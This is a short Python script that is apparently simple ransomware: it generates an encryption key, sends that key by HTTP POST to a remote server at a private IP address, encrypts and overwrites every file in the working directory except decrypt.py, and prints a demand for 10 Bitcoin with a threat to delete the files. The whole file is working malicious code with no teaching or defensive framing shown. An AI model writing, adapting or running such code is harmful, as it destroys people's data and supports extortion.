import requests
import os
from cryptography.fernet import Fernet

def main(a):
    u = 'http://192.168.18.181:12340/send-key'
    response = requests.post(u, data={'key': a})

a = Fernet.generate_key()
main(a)

b = []
for f in os.listdir():
    if f == "decrypt.py":
        continue
    if os.path.isfile(f):
        b.append(f)

for f in b:
    with open(f, "rb") as thefile:
        c = thefile.read()
        c_e = Fernet(a).encrypt(c)
    with open(f, "wb") as thefile:
        thefile.write(c_e)

print("All your files have been encrypted!\nSend me 10 Bitcoin or I'll delete them in 24 hours!!!")
print("This is the wallet (or link) **********.")